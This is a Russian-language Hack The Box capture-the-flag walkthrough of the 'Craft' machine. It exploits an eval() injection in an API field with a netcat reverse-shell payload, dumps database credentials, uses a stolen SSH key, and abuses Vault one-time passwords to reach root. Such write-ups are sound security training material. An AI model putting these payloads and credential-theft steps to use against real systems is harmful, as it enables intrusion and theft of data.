# Hack The Box 

| Name  | Difficulty |
| ----- | ---------- |
| Craft | Medium     |

## Own User

#### Stage 1

Сканируем с помощью утилиты `nmap` 

```python
nmap -sV -sC -T4 -p 1-10000 10.10.10.110
```
В результате имеем следующие открытые порты: 
```python
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.15.8
6022/tcp open  ssh      (protocol 2.0)
```

Переходим в браузере по ссылке https://10.10.10.110/ Пройдясь по сайту обнаруживаем поддомены. Для лучшей работы с машиной следует прописать поддомены в файле `/etc/hosts`: 
```python
10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
``` 

<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_01.png" height="150">




#### Stage 2

Перейдем на `https://gogs.craft.htb/`. Ресурс является оболочкой для `git` и чем-то напоминает `github`. Внимательно рассмотрим сорцы и коммиты. 

В коммите по ссылке https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1 обнаруживаем пароль и логин для аутентификации.
```python
auth=('dinesh', '4aUh0A8PbVJxgd')
```



#### Stage 3

На главное странице говорится о **REST**, а значит на сайте есть **API**: https://api.craft.htb/api/ 

<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_02.png" height="300">

Первым делом напишем небольшой скриптик

Попробуем авторизоваться

```python
login = 'dinesh'
password = '4aUh0A8PbVJxgd'
auth = session.get('https://api.craft.htb/api/auth/login', auth=(login, password), verify=False)
```

Проверим, действительно ли мы авторизованы:

```python
check = session.get('https://api.craft.htb/api/auth/check', verify=False)
```

Проверка авторизации возвращает ошибку.

В сорцах на `git'e` обнаруживаем подозрительный HTTP - заголовок: `'X-Craft-API-Token'`.  Внимательно рассмотрим как он обрабатывается и попробуем снова: 

```python
auth = session.get('https://api.craft.htb/api/auth/login', auth=(login, password), verify=False)

auth_json = json.loads(auth.text)
token = auth_json['token']
headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

check = session.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
```

Отлично! Мы авторизировались



#### Stage 4

На странице **API**, имеется несколько других запросов. Один из них **POST**-запрос:

<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_03.png" height="200">

В файле `craft_api/api/brew/endpoints/brew.py` параметр `abv` обрабатывается с помощью функции `eval()` 

```python
if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
```

Но, мы знаем, что у функции `eval()` в `python` есть уязвимость. Воспользуемся следующий пейлодом: 

```python
abv = "__import__('os').system('cat /etc/passwd')"
```

И отправим его на сервер

```python
payload = {
  "id": 0,
  "brewer": "ololo",
  "name": "ololo",
  "style": "ololosha",
  "abv": abv
}
json_payload = json.dumps(payload)

brew = session.post('https://api.craft.htb/api/brew/', headers=headers, data=json_payload, verify=False)
```

Возвращается ошибка. Попробуем прокинуть **shell** через **netcat**. 

На хосте запустим прослушку **4444** порта

```python
nc -l -p 4444
```

И изменим параметр **abv** на то, чтобы сервер запустил `/bin/sh` и передал управление на наш ip-адрес на 4444 порту: 

```python
abv = "__import__('os').system('nc IP_HOST 4444 -e /bin/sh')"
```

где **IP_HOST** - ip-адрес хоста

Запускаем сплоит и мы оказываем на машине с правами **root**. К сожелению мы находимся в Докере, поэтому флага здесь нет.

[Ссылка на сплоит](https://github.com/axelmaker/ctf-writeups/blob/master/HackTheBox/Craft/exploit.py)



#### Stage 5

Для лучшего отображения, воспользуемся библиотека языка `python` - **pty**, активировав в нем **shell**: 

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

В папке `/opt/app ` лежит файл `dbtest.py`. Изучив его, видим, что он работает с БД **MySQL**.  Попробуем узнать, что у нас лежит в БД. Запускаем shell python'a: 

```python
python
```

Пропишем следующие команды для соединения с **MySQL**:

```python
>>> import pymysql
>>> from craft_api import settings
>>> connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor)
>>> cursor = connection.cursor()
```

Выведем список БД: 

```python
>>> cursor.execute("SHOW DATABASES;")
>>> cursor.fetchone()
>>> cursor.fetchone()
```

Из двух БД нас интересует *craft*. Отобразим список таблиц в БД *craft*: 

```python
>>> cursor.execute("SHOW TABLES from craft;")
>>> cursor.fetchone()
>>> cursor.fetchone()
```

На глаза попадается таблица *user*. Выведем поля таблицы:

```python
>>> cursor.execute("SHOW COLUMNS FROM user FROM craft;") 
>>> for _ in range(3): cursor.fetchone()
```

В таблице имеется 3 записи, отобразим их: 

```python
>>> cursor.execute("SELECT id, username, password FROM user") 
>>> for _ in range(3): cursor.fetchone()
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
```

Первый пользователь нам известен, остальные два нет. 



#### Stage 6

Попробуем авторизироваться с логином и паролем пользователей на https://gogs.craft.htb/. Расмотрев их профили, обнаруживаем у пользователя **gilfoyle** приватный репозиторий. В конце репозитория имеется папка `.ssh` (ай-яй-яй :) ). Вытаскиваем от туда приватный ключ и сохраняем в файл  **id_rsa_craft**.

Известно, что на ip адресе открыт порт **ssh**, воспользовавшись ключем зайдем на него: 

```python
ssh -i id_rsa_craft gilfoyle@10.10.10.110
```

У нас запросят секретную фразу, введем ту, что нашли в БД. 

Заходим на машину и выполняем: 

```cat uset.txt```

Получаем флаг.

> bbf4...................12d4



### Root User

Следующим этапом необходимо получить доступ к пользователю **root**.

Еще раз посмотрим на приватный репозиторий пользователя **gilfoyle**. В нем обнаруживаем подозрительный файл https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh. Воспользовавшись гуглом читам про команду **vault**. 

На сайте https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html сказано, что с помощью  **vault** можно создать учетные данные для удаленного хоста. 

<img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_04.png" height="350">

Попробуем проэксплуатировать на нашей машине: 

```python
vault write ssh/creds/root_otp ip=10.10.10.110
```

В результате мы сгенерировали ключ для пользователя **root**. 

Проверим: 

```python
ssh root@10.10.10.110
```

Вуаля! Получилось! Делаем: 

```cat root.txt```

И получаем флаг.

> 831d...................1591
